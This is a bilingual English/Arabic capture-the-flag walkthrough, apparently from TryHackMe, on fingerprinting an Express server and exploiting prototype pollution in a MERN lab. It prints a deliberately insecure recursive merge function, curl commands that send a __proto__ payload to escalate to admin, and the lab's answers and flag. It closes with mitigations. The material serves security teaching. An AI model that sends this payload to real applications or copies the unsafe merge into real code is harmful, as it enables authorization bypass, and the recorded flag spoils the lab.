# Task 02: MERN Stack (مكدس MERN: بصمة Express وتلويث النموذج الأولي Prototype Pollution)

---

### المرحلة أ: نص المهمة الأصلي والأسئلة (Original Task Content & Questions)

#### English Task Description
The MERN stack consists of **MongoDB**, **Express.js**, **React**, and **Node.js**. Express is the minimal and flexible Node.js web application framework that provides a robust set of features for web and mobile applications.

**Fingerprinting Express (Port 3000):**
When querying the web server running on port 3000 using `curl -I http://MACHINE_IP:3000/`, several high-confidence signals immediately reveal the Express framework:
1. `X-Powered-By: Express` header (default in Express unless removed via `app.disable('x-powered-by')` or `helmet()`).
2. `Set-Cookie: connect.sid=s%3A...` generated by the standard `express-session` middleware.
3. Requesting an unhandled route (`curl http://MACHINE_IP:3000/nonexistent`) returns Express's signature plain-text error: `<pre>Cannot GET /nonexistent</pre>`.
4. The client-side React bundle injects a root DOM node `<div id="root"></div>`.

**Vulnerability: Prototype Pollution:**
JavaScript uses a prototype-based inheritance model. Every object in JavaScript has an internal prototype link (`[[Prototype]]`, accessible via `__proto__`). If an application recursively merges user-supplied JSON into an existing object without filtering keys like `__proto__`, `constructor`, or `prototype`, an attacker can modify `Object.prototype`.

Because virtually all objects inherit from `Object.prototype`, adding properties to it will inject those properties across all existing and newly created objects in the Node.js runtime process!

On port 3000:
- Endpoint `POST /api/user/update` accepts arbitrary JSON and uses an insecure `merge(target, source)` function.
- Endpoint `GET /api/admin/flag` checks if `currentUser.isAdmin` is true. If ordinary users lack this property, the JavaScript engine traverses the prototype chain up to `Object.prototype`. If `Object.prototype.isAdmin` has been polluted to `true`, the authorization check succeeds!

#### الأسئلة المطروحة (Questions):
1. What HTTP response header confirms an Express.js backend is running? (Answer Format: Header-Name: Value)
2. What is the name of the Express session cookie you will use to replay requests after polluting the prototype? (Answer Format: cookie-name)
3. Send the prototype pollution payload to the merge endpoint. What is the flag returned by the admin route after the bypass succeeds? (Answer Format: THM{...})

### المرحلة ب: التفكير التحليلي المستقل والحس الأمني (Independent Critical Thinking & OpSec)
* **تحليل آلية تلوث النموذج الأولي (Prototype Pollution Internals):**
  * في جافا سكريبت، الكائنات ترث من `Object.prototype`. عندما تُكتب دالة دمج كائنات (recursive object merge) مثل:
    ```javascript
    function merge(target, source) {
        for (let key in source) {
            if (typeof source[key] === 'object' && source[key] !== null) {
                if (!target[key]) target[key] = {};
                merge(target[key], source[key]);
            } else {
                target[key] = source[key];
            }
        }
    }
    ```
    إذا قام المهاجم بإرسال حقل باسم `__proto__`، فإن `target["__proto__"]` لا يشير إلى خاصية عادية بل يشير إلى النموذج الأولي للكائن العام `Object.prototype`!
  * نتيجة لذلك، فإن تعيين `target["__proto__"]["isAdmin"] = true` يضع الخاصية `isAdmin: true` على كل كائن في بيئة Node.js بالكامل.
* **الحفاظ على جلسة المستخدم عبر `connect.sid`:**
  * لكي تعترف الواجهة الخلفية بهويتك عند التبديل بين نقطة الدمج `POST /api/user/update` ونقطة الفحص `GET /api/admin/flag`، يجب حفظ وإعادة إرسال كعكة الجلسة `connect.sid`.

### المرحلة ج: التلميحات والإرشادات المتدرجة (Guided Progressive Hints)
1. **التلميح الأول (المستوى التمهيدي):**
   * افحص ترويسات الرد عبر `curl -I http://MACHINE_IP:3000/`. ستجد الترويسة المباشرة `X-Powered-By: Express`، واسم الكعكة في ترويسة `Set-Cookie`.
2. **التلميح الثاني (المستوى العملي):**
   * احفظ الجلسة في ملف كعكات باستخدام معامل curl: `-c cookies.txt`.
   * استخدم `POST` مع نوع المحتوى `application/json` لإرسال حمولة التلويث: `{"__proto__": {"isAdmin": true}}`.
3. **التلميح الثالث (مستوى الحل المتقدم):**
   * بعد إرسال الطلب بنجاح، قم بطلب الرابط المحمي `GET /api/admin/flag` مستخدماً نفس ملف الكعكات `-b cookies.txt`. سيتجاوز الخادم فحص الصلاحيات ويعيد العلم.

### المرحلة د: الحل العملي الكامل والعمق التقني (Complete Practical Solution & Technical Deep Dive)

#### الخطوة 1: فحص الترويسات وكعكات الجلسة
```bash
# تنفيذ طلب فحص الترويسات على المنفذ 3000
curl -I http://MACHINE_IP:3000/
```
**المخرجات المستلمة (HTTP Response Headers):**
```http
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: connect.sid=s%3Aabcdef123456...; Path=/; HttpOnly
Content-Type: text/html; charset=UTF-8
Content-Length: 462
```
* **تأكيد الترويسة:** `X-Powered-By: Express`
* **تأكيد اسم الكعكة:** `connect.sid`

---

#### الخطوة 2: اختبار مسار الإدارة المحمي قبل التلويث
```bash
# إنشاء وحفظ الجلسة في cookies.txt
curl -c cookies.txt http://MACHINE_IP:3000/

# محاولة الوصول إلى لوحة الإدارة
curl -b cookies.txt http://MACHINE_IP:3000/api/admin/flag
```
**الاستجابة:**
```json
{"error": "Not authorized"}
```
الخادم يرفض الطلب لأن كائن المستخدم الحالي لا يحتوي على الخاصية `isAdmin: true`.

---

#### الخطوة 3: إرسال حمولة تلويث النموذج الأولي (Prototype Pollution Payload)
```bash
# إرسال حمولة التلويث عبر POST إلى نقطة تحديث بيانات المستخدم
curl -b cookies.txt -c cookies.txt \
  -X POST http://MACHINE_IP:3000/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'
```
**الاستجابة:**
```json
{"status": "success", "message": "User profile updated"}
```
عند معالجة هذا الـ JSON داخل دالة الدمج في Node.js، تم تلويث `Object.prototype.isAdmin = true`.

#### الخطوة 4: طلب العلم والحصول عليه بعد التجاوز
```bash
# إعادة طلب مسار الإدارة المحمي
curl -b cookies.txt http://MACHINE_IP:3000/api/admin/flag
```
**الاستجابة المستلمة:**
```json
{"success": true, "flag": "THM{pr0t0_p0llut3d}"}
```

### المرحلة ز: الاستنتاج التعليمي وجوهر الاختبار (Key Educational Takeaway)
ثغرات تلويث النموذج الأولي (Prototype Pollution) في بيئات Node.js ناتجة عن دمج مدخلات المستخدم غير المعقمة في كائنات النظام. الحماية الفعالة تتطلب استخدام `Object.create(null)` للكائنات القاموسية، وتجميد النموذج الأولي عبر `Object.freeze(Object.prototype)`، وتطهير المفاتيح الخطرة (`__proto__`, `constructor`, `prototype`) قبل المعالجة.
